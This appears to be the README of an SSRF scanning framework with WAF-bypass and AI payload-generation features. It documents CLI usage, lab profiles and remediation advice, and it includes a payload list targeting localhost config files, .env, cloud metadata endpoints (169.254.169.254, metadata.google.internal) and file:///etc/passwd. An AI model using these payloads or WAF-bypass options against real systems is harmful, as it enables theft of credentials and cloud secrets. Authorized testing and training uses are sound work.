<p align="center">
  <img src="./docs/SSRF%20FRAMEWORK.png" alt="Ultimate SSRF Framework Banner" width="100%">
</p>

# Ultimate SSRF Framework v5.0 - WAF-Bypass Edition

**Ultimate SSRF Framework** is an experimental SSRF discovery, validation and reporting framework for authorized security testing, bug bounty research, internal assessments, CTF labs, training environments and defensive validation.

The framework focuses on safe SSRF testing, callback/OAST validation, direct URL testing, WAF-aware behavior, AI-assisted payload generation, dynamic payload expansion, MITRE ATT&CK mapping, remediation guidance and clean reports for security teams.

> Built by **belladonnask**

> GitHub: https://github.com/KauanCosta2000

> LinkedIn: https://www.linkedin.com/in/kauan-costa-105b12345/

> Banner created by [@Fezitooo1](https://x.com/Fezitooo1)

<p align="center">
  <img src="docs/demo.gif" alt="Ultimate SSRF Framework Demo" width="100%">
</p>

---

## Important Disclaimer

This project is intended only for:

* Authorized penetration testing
* Bug bounty programs where testing is explicitly allowed
* Internal security validation
* Labs, CTFs and training environments
* Defensive research

Do not use this tool against systems you do not own or do not have explicit permission to test.

Scanner output is not automatic proof of impact. Always manually validate findings before reporting them.

---

## What Is New in v5.0

Ultimate SSRF Framework v5.0 introduces the **WAF-Bypass Edition**, focused on safer bug bounty workflows, WAF-aware testing and better reporting.

New or improved in this version:

* WAF fingerprinting improvements
* WAF-safe mode
* Optional WAF bypass mode
* Safe bug bounty preset with `--bughunters-safe`
* Dynamic payload generation
* AI-assisted dynamic payload expansion
* AI-generated manual test suggestions
* Sheep AI integration
* AI provider profiles: `fast`, `balanced`, `deep`
* AI config file support
* OpenRouter support
* MITRE ATT&CK export
* Remediation report export
* Better direct URL testing
* Safe cancellation during scans
* Update checking and auto-update support
* More detailed JSON, HTML, SIEM and attack map output

---

## Features

### Core SSRF Testing

* Common SSRF parameter testing
* Blind SSRF validation using callback/OAST domains
* Burp Collaborator-compatible callback support
* Localhost and loopback payloads
* Cloud metadata read-only probes
* URL parser bypass payloads
* Encoded IP payloads
* IPv6 and decimal/octal/hex IP payloads
* Scheme confusion checks
* Redirect-based SSRF checks
* Header injection edge cases
* Safe non-destructive payloads by default
* Custom payload support
* Payload file support
* Multi-target support

### WAF-Aware Testing

* WAF fingerprinting
* WAF block detection
* WAF-safe mode
* Optional WAF bypass payload expansion
* Stop scan after first WAF block
* Stop scan after a configurable number of WAF blocks
* Debug mode for payloads and WAF behavior

Useful options:

```bash
--waf-safe-mode
--waf-bypass-mode
--stop-on-waf-block
--max-waf-blocks 3
--debug-waf
```

### Safe Bug Bounty Preset

The `--bughunters-safe` preset is designed for safer bug bounty testing.

It enables a conservative workflow with:

* Sheep AI by default when available
* Dynamic OAST payloads
* AI method suggestions
* WAF-safe mode
* Safer delay defaults
* Safer module selection
* Disabled dangerous payloads

Example:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --bughunters-safe \
  --output reports-bughunters \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

---

## Direct URL Mode

For labs and known vulnerable endpoints, the framework can test an exact URL template:

```bash
--url "https://target.com/fetch?url=PAYLOAD"
```

This mode replaces `PAYLOAD` with each payload and sends direct HTTP requests.

Example:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --url "https://example.com/fetch?url=PAYLOAD" \
  --payload localhost/config \
  --callback your-callback.oastify.com
```

This is useful for:

* TryHackMe labs
* HTB Academy labs
* PortSwigger labs
* Local mock targets
* Known URL fetchers
* Bug bounty endpoints with a confirmed URL parameter

---

## Lab Profiles

The framework includes lab-friendly profiles.

```bash
--lab-profile generic
--lab-profile thm
--lab-profile thm-basic-ssrf
```

These profiles are useful for local/reflected SSRF labs where the payload is something like:

```text
localhost/config
localhost/copyright
http://127.0.0.1/config
```

Example:

```bash
python ssrf_arsenal.py \
  --target hrms.thm \
  --lab-profile thm-basic-ssrf \
  --url "http://hrms.thm/?url=PAYLOAD" \
  --payload-file payloads.txt \
  --callback your-callback.oastify.com \
  --output reports-hrms \
  --no-ai
```

---

## Payload Files

You can provide payloads manually:

```bash
--payload localhost/config
```

Or use a payload file:

```bash
--payload-file payloads.txt
```

Use only custom payloads:

```bash
--custom-payloads-only
```

Example `payloads.txt`:

```text
localhost/copyright
localhost/hello
localhost/config
localhost/config.php
localhost/connection
localhost/connection.php
localhost/db
localhost/database
localhost/admin
localhost/.env
http://127.0.0.1/
http://127.0.0.1/copyright
http://127.0.0.1/config
http://127.0.0.1/config.php
http://localhost/
http://localhost/config
http://localhost/config.php
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://metadata.google.internal/computeMetadata/v1/
file:///etc/passwd
```

If a `payloads.txt` file exists in the current directory, the framework may use it automatically depending on the selected mode/profile.

---

## Dynamic Payloads

Dynamic payload mode generates additional non-destructive payloads based on scan context and observed behavior.

Enable dynamic payloads:

```bash
--dynamic-payloads
```

Enable AI-assisted dynamic payloads:

```bash
--dynamic-ai
```

Control dynamic rounds and max payloads:

```bash
--dynamic-rounds 2
--dynamic-max 30
```

Example:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --dynamic-payloads \
  --dynamic-ai \
  --dynamic-rounds 2 \
  --dynamic-max 30 \
  --output reports-dynamic
```

Dynamic payload generation is designed for authorized testing and should still be manually reviewed.

---

## Real-Time Request Output

The scanner prints each tested request in real time.

Example output:

```text
[REQ] GET https://target.com/fetch?url=http%3A//callback.oast.fun phase=Basic endpoint=/fetch param=url payload=http://callback.oast.fun
[200] NOT_CONFIRMED bytes=1543 time=1.22s

[REQ] GET https://target.com/fetch?url=localhost/config phase=Direct URL endpoint=/ param=url payload=localhost/config
[200] VULNERABLE bytes=482 time=0.31s
```

This helps debug:

* Which URL was tested
* Which parameter was used
* Which payload was sent
* HTTP status code
* Response size
* Response time
* Whether evidence was confirmed

---

## Safe Scan Cancellation

During a scan, the framework supports safe cancellation from the terminal.

```text
[CANCEL] Press Q to cancel safely during the scan. Ctrl+C still forces stop.
```

Press:

```text
Q
```

The scanner will stop safely, finish the current request and still generate partial reports.

Change the cancel key:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --cancel-key x
```

Disable the hotkey:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --no-cancel-hotkey
```

---

## Update Check

On startup, the tool can ask whether it should check for updates from the selected branch.

```text
Check for updates from origin/main? [y/N]:
```

Manual update:

```bash
python ssrf_arsenal.py --update
```

Auto-update before running:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --auto-update
```

Skip update checks:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --no-update-check
```

Update without reinstalling dependencies:

```bash
python ssrf_arsenal.py \
  --update \
  --no-update-deps
```

By default, update pulls from:

```text
origin/main
```

Change the update branch:

```bash
python ssrf_arsenal.py --update --update-branch dev
```

---

## AI Integration

Ultimate SSRF Framework supports optional AI-assisted testing and triage.

Supported providers:

```text
openai
claude
openrouter
gemini
ollama
mistral
deepseek
sheep
none
```

AI features include:

* Safe SSRF payload generation
* Dynamic payload suggestions
* Endpoint validation payloads
* Suggested safe Web/API checks
* Manual review hints
* Triage summaries
* Remediation hints
* MITRE-aware reporting support
* AI method suggestions for discovered endpoints

AI output is not proof of vulnerability. Always manually validate findings before reporting them.

---

## AI Profiles

AI profiles help select model behavior based on speed and depth.

Available profiles:

```text
fast
balanced
deep
```

Example:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --ai-provider sheep \
  --ai-profile balanced \
  --ai-key "$SHEEP_TOKEN"
```

Show AI configuration:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --ai-provider sheep \
  --ai-show-config
```

List suggested AI models:

```bash
python ssrf_arsenal.py --list-ai-models
```

Use multiple model candidates:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --ai-provider openrouter \
  --ai-models "openai/gpt-4o,anthropic/claude-3.5-sonnet"
```

---

## AI Config File

You can load AI settings from a JSON or YAML config file.

Example `ai-config.json`:

```json
{
  "ai": {
    "provider": "sheep",
    "model": "hunter",
    "profile": "balanced",
    "timeout": 45,
    "retries": 3,
    "max_tokens": 4096
  }
}
```

Run:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --ai-config ai-config.json
```

Do not commit API keys or tokens to the repository.

---

## Sheep AI Support

Sheep AI support is experimental.

Provider name:

```text
sheep
```

Available models:

```text
auto
scout
hunter
sage
```

Recommended usage:

* `scout` for lightweight analysis
* `hunter` for security analysis and vulnerability triage
* `sage` for deeper reports and executive summaries
* `auto` to let Sheep choose automatically

### Use the Sheep token safely

Do not paste your Sheep token directly into commands, scripts, README files or commits.

Use an environment variable.

Linux / macOS / Kali:

```bash
export SHEEP_TOKEN="shp_YOUR_TOKEN_HERE"
```

PowerShell:

```powershell
$env:SHEEP_TOKEN="shp_YOUR_TOKEN_HERE"
```

Hunter example:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --ai-provider sheep \
  --ai-key "$SHEEP_TOKEN" \
  --ai-model hunter \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

Sage example:

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --ai-provider sheep \
  --ai-key "$SHEEP_TOKEN" \
  --ai-model sage \
  --delay 2 \
  --output reports-sheep-sage \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

If a Sheep token is exposed, rotate it immediately.

---

## AI-Suggested Safe Checks

When AI is enabled, the framework can ask the selected model to suggest additional safe checks based on discovered endpoints and parameters.

The AI does not execute arbitrary commands or unrestricted exploits. It only returns structured suggestions, and the framework validates them through controlled logic.

Enable method suggestions:

```bash
--ai-method-suggestions
```

Enable direct AI phase in Direct URL mode:

```bash
--direct-ai
```

Supported safe review categories include:

```text
ssrf
open_redirect
cors_misconfig
header_injection
host_header_injection
path_traversal_readonly
lfi_readonly
information_disclosure
debug_endpoint
exposed_config
exposed_backup_file
exposed_admin_panel
idor_review
authz_review
mass_assignment_review
api_versioning_issue
graphql_introspection
graphql_ssrf_review
jwt_misconfig_review
cache_poisoning_review
request_smuggling_review
webhook_ssrf_review
file_upload_review
redirect_uri_review
oauth_misconfig_review
cloud_metadata_review
k8s_exposure_review
service_mesh_exposure_review
```

Results may be classified as:

```text
vulnerable
suspected_other_issue
manual_review
not_confirmed
error
```

AI-suggested checks must be manually validated before being reported.

---

## MITRE ATT&CK Mapping

The framework can export MITRE ATT&CK mapping for confirmed or relevant findings.

Enable it with:

```bash
--export-mitre
```

Generated MITRE export:

```text
mitre_attack_<target>.json
remediation_<target>.md
```

Example mapped techniques include:

```text
T1190        Exploit Public-Facing Application
T1595        Active Scanning
T1046        Network Service Discovery
T1552        Unsecured Credentials
T1552.005    Cloud Instance Metadata API
T1528        Steal Application Access Token
T1613        Container and Resource Discovery
T1059        Command and Scripting Interpreter
```

The MITRE export is designed for security validation and defensive reporting.

Atomic Red Team references may be included for defensive validation context, but the framework does not execute Atomic Red Team tests automatically.

---

## Remediation Guidance

Reports include remediation guidance for common SSRF-related risks:

```text
SSRF
Cloud metadata exposure
Credential disclosure
Internal service discovery
Kubernetes exposure
Protocol abuse
Header injection
```

Example remediation guidance:

* Use strict allowlists for outbound destinations.
* Normalize and validate URLs before request execution.
* Block loopback, link-local, private, multicast and internal ranges after DNS resolution.
* Disable unsafe protocols such as `file://`, `gopher://`, `dict://`, `ftp://` and `ldap://`.
* Disable redirects or re-validate every redirect hop.
* Restrict outbound egress at the network level.
* Enforce cloud metadata protections such as AWS IMDSv2.
* Rotate exposed secrets immediately.
* Move secrets to a managed secret store.
* Add secret scanning in CI and runtime log redaction.
* Apply Kubernetes NetworkPolicies where relevant.

---

## Reports and Exports

Ultimate SSRF Framework supports multiple output formats.

Generated files may include:

```text
ssrf_<target>_<timestamp>.json
ssrf_report_<target>_<timestamp>.html
api_report_<target>.json
siem_<target>.cef
attack_map_<target>.gexf
mitre_attack_<target>.json
remediation_<target>.md
ai_payloads_<target>.json
ai_triage_<target>.md
ai_method_suggestions_<target>.md
ai_method_suggestions_<target>.json
nuclei_<target>.yaml
```

### HTML Report

The HTML report is designed as a simple security validation report for security teams.

It includes:

* Executive Summary
* Scope
* Findings
* Evidence
* MITRE ATT&CK Mapping
* Remediation
* Retest Checklist
* Attempts
* AI Checks
* WAF information when available

The HTML report includes navigation buttons at the top so reviewers can jump between sections quickly.

Open it with:

```bash
firefox reports/ssrf_report_*.html
```

---

## Example Commands

### Basic scan

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --output reports-basic
```

### Safe scan with exports

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --delay 2 \
  --output reports-example \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

### Safe bug bounty scan

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --bughunters-safe \
  --delay 2 \
  --output reports-bugbounty \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

### WAF-safe scan

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --waf-safe-mode \
  --max-waf-blocks 3 \
  --delay 2 \
  --output reports-waf-safe
```

### WAF bypass mode

Only use this on systems where you have explicit permission to test WAF behavior.

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --waf-bypass-mode \
  --debug-waf \
  --delay 2 \
  --output reports-waf-bypass
```

### Direct URL mode

```bash
python ssrf_arsenal.py \
  --target example.com \
  --url "https://example.com/fetch?url=PAYLOAD" \
  --payload-file payloads.txt \
  --callback your-callback.oastify.com \
  --output reports-direct \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

### TryHackMe-style lab

```bash
python ssrf_arsenal.py \
  --target hrms.thm \
  --lab-profile thm-basic-ssrf \
  --url "http://hrms.thm/?url=PAYLOAD" \
  --payload-file payloads.txt \
  --callback your-callback.oastify.com \
  --delay 1 \
  --output reports-hrms \
  --no-ai \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

### Sheep Hunter scan

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --ai-provider sheep \
  --ai-key "$SHEEP_TOKEN" \
  --ai-model hunter \
  --delay 2 \
  --output reports-sheep-hunter \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

### Sheep with dynamic AI

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --ai-provider sheep \
  --ai-key "$SHEEP_TOKEN" \
  --ai-model hunter \
  --dynamic-payloads \
  --dynamic-ai \
  --ai-method-suggestions \
  --delay 2 \
  --output reports-sheep-dynamic \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

### Target file scan

```bash
python ssrf_arsenal.py \
  --target-file targets.txt \
  --callback your-callback.oastify.com \
  --delay 2 \
  --output reports-targets \
  --ai-provider sheep \
  --ai-key "$SHEEP_TOKEN" \
  --ai-model hunter \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

### Proxy scan

```bash
python ssrf_arsenal.py \
  --target example.com \
  --callback your-callback.oastify.com \
  --proxy http://127.0.0.1:8080 \
  --proxy-type http \
  --output reports-proxy
```

---

## Target Files

Create a `targets.txt` file:

```text
example.com
api.example.com
https://app.example.com
```

Run:

```bash
python ssrf_arsenal.py \
  --target-file targets.txt \
  --callback your-callback.oastify.com \
  --output reports-target-file
```

Do not put wildcard patterns like this directly:

```text
*.example.com
```

Resolve or enumerate real hosts first, then add the real hostnames to the target file.

---

## Mock Validation Target

You can validate the framework locally with a simple mock SSRF target.

Create `mock_ssrf_target.py`:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        qs = parse_qs(parsed.query)
        payload = qs.get("url", [""])[0]

        if parsed.path != "/fetch":
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not found")
            return

        if payload in ("localhost/config", "http://127.0.0.1/config", "http://localhost/config"):
            body = """<?php
$adminURL = "http://admin.internal.local";
$username = "admin_test";
$password = "test_password_123";
DB_HOST = "127.0.0.1";
DB_PASSWORD = "mock_db_password";
?>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(body.encode())
            return

        if payload in ("localhost/copyright", "http://127.0.0.1/copyright"):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Copyright 2026 Mock HRMS")
            return

        if "169.254.169.254" in payload:
            self.send_response(403)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Blocked metadata access")
            return

        self.send_response(400)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(f"Invalid or unsupported url parameter: {payload}".encode())

HTTPServer(("127.0.0.1", 8088), Handler).serve_forever()
```

Run the mock target:

```bash
python mock_ssrf_target.py
```

Then test the framework:

```bash
python ssrf_arsenal.py \
  --target 127.0.0.1:8088 \
  --url "http://127.0.0.1:8088/fetch?url=PAYLOAD" \
  --payload-file payloads.txt \
  --callback example.oast.fun \
  --delay 1 \
  --output reports-mock-validation \
  --no-ai \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre \
  --no-update-check
```

---

## Installation

Clone the repository:

```bash
git clone https://github.com/KauanCosta2000/Ultimate-ssrf-Framework.git
cd Ultimate-ssrf-Framework
```

Create a virtual environment:

```bash
python3 -m venv .venv
source .venv/bin/activate
```

Install dependencies:

```bash
python -m pip install --upgrade pip
pip install -r requirements.txt
python -m playwright install chromium
```

Run help:

```bash
python ssrf_arsenal.py --help
```

---

## Windows PowerShell Installation

```powershell
git clone https://github.com/KauanCosta2000/Ultimate-ssrf-Framework.git
cd Ultimate-ssrf-Framework
python -m venv .venv
.\.venv\Scripts\Activate.ps1
python -m pip install --upgrade pip
pip install -r requirements.txt
python -m playwright install chromium
python ssrf_arsenal.py --help
```

---

## Kali Linux Installation

```bash
git clone https://github.com/KauanCosta2000/Ultimate-ssrf-Framework.git
cd Ultimate-ssrf-Framework

python3 -m venv .venv
source .venv/bin/activate

python -m pip install --upgrade pip
pip install -r requirements.txt
python -m playwright install chromium

python ssrf_arsenal.py --help
```

If Kali blocks global Python package installation, use a virtual environment instead of installing globally.

---

## Requirements

Expected dependencies:

```text
playwright>=1.40.0
aiohttp>=3.9.0
jinja2>=3.1.0
httpx>=0.27.0
aiohttp_socks>=0.10.1
PyYAML>=6.0.0
networkx>=3.0
pytest>=8.0.0
```

---

## CLI Reference

```text
Target:
  --target, -t          Single target
  --targets             Comma-separated target list
  --target-file, -f     File containing targets, one per line

Request selection:
  --param               Specific parameter to test
  --path                Specific path to test. Can be used multiple times
  --url                 Exact URL template. Use PAYLOAD as placeholder
  --scheme              Target scheme when target has no http:// or https://

Payloads:
  --payload             Custom payload. Can be used multiple times
  --payload-file        File containing payloads, one per line
  --custom-payloads-only
                        Use only custom payloads
  --debug-payloads      Print payload debugging information

Bug bounty and WAF:
  --bughunters-safe     Safe bug bounty preset
  --waf-safe-mode       Stop dynamic expansion after WAF blocking is observed
  --waf-bypass-mode     Aggressively generate WAF bypass payloads when a block is detected
  --stop-on-waf-block   Cancel the run after the first confirmed WAF block
  --max-waf-blocks      Cancel after this many WAF blocked attempts. 0 disables the limit
  --debug-waf           Print WAF debugging information

Callbacks:
  --callback, -c        Callback/OAST domain
  --collaborator        Collaborator/OAST domain alias
  --burp-collaborator   Burp Collaborator domain alias

Lab and direct modes:
  --lab-profile         Lab profile: generic, thm, thm-basic-ssrf
  --direct-ai           Run AI phase in direct URL mode

Dynamic payloads:
  --dynamic-payloads    Enable dynamic payload phase
  --dynamic-ai          Enable AI-assisted dynamic payload generation
  --dynamic-rounds      Dynamic payload rounds. Default: 1
  --dynamic-max         Max dynamic payloads. Default: 30

Output and runtime:
  --body-snippet-size   Max response snippet stored per attempt
  --delay, -d           Delay between requests
  --quiet, -q           Reduce output
  --verbose, -v         Increase output
  --visible             Run browser visibly
  --output, -o          Output directory

Proxy:
  --proxy, -p           Proxy server
  --proxy-file          Proxy list
  --proxy-type          Proxy type: http or socks5

AI:
  --ai-provider         AI provider: claude, openai, openrouter, ollama, gemini, mistral, deepseek, sheep, none
  --ai-key              AI API key
  --ai-model            AI model
  --ai-models           Comma-separated model candidates
  --ai-profile          AI profile: fast, balanced, deep
  --ai-base-url         Custom AI base URL
  --ai-timeout          AI timeout in seconds
  --ai-retries          AI retry count
  --ai-max-tokens       AI max tokens
  --ai-temperature      AI temperature
  --ai-config           AI JSON/YAML config file
  --ai-show-config      Print safe AI config
  --list-ai-models      List suggested AI models
  --ai-method-suggestions
                        Ask AI for safe manual test methods

Feature toggles:
  --no-waf              Disable WAF fingerprinting
  --no-websocket        Disable WebSocket checks
  --no-grpc             Disable gRPC checks
  --no-k8s              Disable Kubernetes checks
  --no-serverless       Disable serverless checks
  --no-graphql          Disable GraphQL checks
  --no-api-schema       Disable API schema checks
  --no-mesh             Disable service mesh checks
  --no-bot-evasion      Disable bot evasion checks
  --no-ai               Disable AI
  --dangerous-payloads  Enable dangerous payloads. Disabled by default

Exports:
  --export-json-api     Export API-style JSON report
  --export-siem         Export CEF/SIEM report
  --attack-map          Export GEXF attack map
  --export-mitre        Export MITRE ATT&CK and remediation reports
  --export-nuclei       Export Nuclei template for confirmed OOB SSRF

Update:
  --update              Pull latest changes from Git
  --auto-update         Automatically update before running
  --no-update-check     Skip startup update prompt
  --no-update-deps      Do not reinstall requirements after update
  --update-branch       Branch to update from. Default: main

Cancellation:
  --cancel-key          Key used to safely cancel scan
  --no-cancel-hotkey    Disable safe cancel hotkey
```

---

## Dangerous Payloads

Dangerous payloads are disabled by default.

Do not enable them unless the environment is fully controlled and explicitly authorized.

```bash
--dangerous-payloads
```

This may include aggressive protocol-level payloads. Do not use this option in normal bug bounty testing unless the program explicitly allows it.

---

## Recommended Workflow

1. Confirm the target is in scope.
2. Start with safe payloads only.
3. Use a callback/OAST domain.
4. Use `--delay 2` or higher for bug bounty targets.
5. Use `--bughunters-safe` when testing real bug bounty targets.
6. Use direct URL mode when you already know the vulnerable parameter.
7. Review the HTML and JSON reports.
8. Validate evidence manually.
9. Remove irrelevant `not_confirmed` attempts before submitting.
10. Submit only confirmed impact.
11. Never report AI output as proof without manual validation.

---

## Example Bug Bounty Workflow

```bash
python ssrf_arsenal.py \
  --target url-checker.example.com \
  --url "https://url-checker.example.com/fetch?url=PAYLOAD" \
  --payload-file payloads.txt \
  --callback your-callback.oastify.com \
  --bughunters-safe \
  --delay 2 \
  --output reports-url-checker \
  --export-json-api \
  --export-siem \
  --attack-map \
  --export-mitre
```

Review:

```bash
find reports-url-checker -type f
grep -RniE "vulnerable|critical|high|callback|metadata|169.254|remediation|MITRE|WAF" reports-url-checker/
firefox reports-url-checker/ssrf_report_*.html
```

---

## Output Meaning

```text
vulnerable
```

Confirmed evidence was found.

```text
not_confirmed
```

The payload was tested, but no evidence was confirmed.

```text
error
```

The request failed, timed out or hit a runtime/network issue.

```text
manual_review
```

The result needs human validation.

```text
suspected_other_issue
```

A non-SSRF issue may exist, but it needs manual validation.

---

## Notes on False Positives and False Negatives

`not_confirmed` does not mean the target is safe.

It only means the framework did not confirm evidence for that specific endpoint, parameter and payload.

AI output is not proof.

Callback-only evidence should be reviewed carefully.

Always validate manually before submitting a bug bounty report.

---

## Security Notes

This tool can generate traffic and payloads that may be blocked or logged by security systems.

For real targets:

* Respect program scope.
* Respect rate limits.
* Avoid aggressive options unless explicitly allowed.
* Use `--delay`.
* Prefer `--bughunters-safe`.
* Do not enable `--dangerous-payloads` unless explicitly authorized.
* Do not store API keys or tokens in commands committed to Git.
* Redact secrets from reports before sharing publicly.

---

## License

Licensed by **belladonnask**.

Use responsibly.
